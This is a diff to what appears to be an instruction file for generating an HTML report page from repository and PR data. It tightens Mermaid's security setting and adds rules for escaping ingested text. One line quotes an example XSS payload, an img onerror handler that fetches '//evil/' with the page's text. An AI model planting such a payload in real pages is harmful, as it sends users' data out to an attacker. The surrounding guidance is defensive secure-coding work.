@@ -14,7 +14,7 @@ One self-contained HTML file in the OS temp directory. Tailwind and Mermaid from
 		<script src="https://cdn.tailwindcss.com"></script>
 		<script type="module">
 			import mermaid from "https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs";
-			mermaid.initialize({ startOnLoad: true, theme: "neutral", securityLevel: "loose" });
+			mermaid.initialize({ startOnLoad: true, theme: "neutral", securityLevel: "strict" });
 		</script>
 		<style>
 			.road-left {
@@ -40,6 +40,15 @@ One self-contained HTML file in the OS temp directory. Tailwind and Mermaid from
 
 </html>
 ```
+
+## Escaping ingested text
+
+Every quote, path, branch name and identifier on this page arrived from somewhere you do not control — a PR comment, a commit message, a file in the repo. The page is opened from disk, so script that runs in it runs with a local-file origin. Two rules, and they are not optional:
+
+- **Escape before you write.** `&` → `&amp;`, `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;` in anything you did not author yourself. A review comment reading `<img src=x onerror=fetch('//evil/'+document.body.innerText)>` is an ordinary string until you paste it raw.
+- **Keep ingested text out of Mermaid blocks.** Diagram labels are yours to write: you name the fork, you name the road. Quote a reviewer in the prose of a card, escaped, where you can see it. `securityLevel: "strict"` in the scaffold is the backstop, not the plan — leave it strict.
+
+The same applies to the `<title>`, to `file:line` evidence, and to anything you drop into an `href`. Branch names accept characters HTML reads as markup.
 
 ## Header
 
